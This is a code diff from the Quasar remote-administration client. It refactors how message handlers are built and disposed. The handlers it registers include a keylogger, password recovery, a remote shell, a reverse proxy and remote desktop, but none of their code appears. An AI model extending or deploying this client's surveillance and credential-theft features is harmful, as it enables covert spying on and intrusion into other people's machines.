@@ -155,15 +155,15 @@ namespace Quasar.Client
             _messageProcessors.Add(new KeyloggerHandler());
             _messageProcessors.Add(new MessageBoxHandler());
             _messageProcessors.Add(new PasswordRecoveryHandler());
-            _messageProcessors.Add(new RegistryHandler(client));
-            _messageProcessors.Add(new RemoteDesktopHandler(client));
+            _messageProcessors.Add(new RegistryHandler());
+            _messageProcessors.Add(new RemoteDesktopHandler());
             _messageProcessors.Add(new RemoteShellHandler(client));
             _messageProcessors.Add(new ReverseProxyHandler(client));
             _messageProcessors.Add(new ShutdownHandler());
             _messageProcessors.Add(new StartupManagerHandler());
             _messageProcessors.Add(new SystemInformationHandler());
             _messageProcessors.Add(new TaskManagerHandler(client));
-            _messageProcessors.Add(new TcpConnectionsHandler(client));
+            _messageProcessors.Add(new TcpConnectionsHandler());
             _messageProcessors.Add(new WebsiteVisitorHandler());
 
             foreach (var msgProc in _messageProcessors)
@@ -178,7 +178,8 @@ namespace Quasar.Client
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Unregister(msgProc);
-                msgProc.Dispose();
+                if (msgProc is IDisposable disposableMsgProc)
+                    disposableMsgProc.Dispose();
             }
         }
 
